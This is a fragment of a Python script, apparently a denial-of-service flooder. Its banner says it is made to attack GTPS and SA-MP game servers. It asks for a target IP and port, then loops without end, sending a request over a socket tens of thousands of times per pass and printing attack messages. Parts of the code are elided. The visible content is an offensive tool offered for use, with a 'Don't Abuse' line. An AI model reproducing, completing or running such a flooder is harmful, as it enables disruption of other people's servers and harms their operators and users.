...
print("------------------------------------------------")
print("[+]Tool Created By Zeys")
print("[+]Don`t Abuse This Tools")
print("")
print("[+]Zeys Private Tools")
print("[+]This Tool Supported To Attack GTPS & samp")
print("[+]Don`t Leak")
ip = str(input(" IP : "))
port = int(input(" PORT ( 80/7777 ) : "))
    ...
    while True:
        try:
            ...
            for x in range(60000):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("PACKET DARI Zeys " + ip)
        except :
            print("Zeys Attack to " + ip)
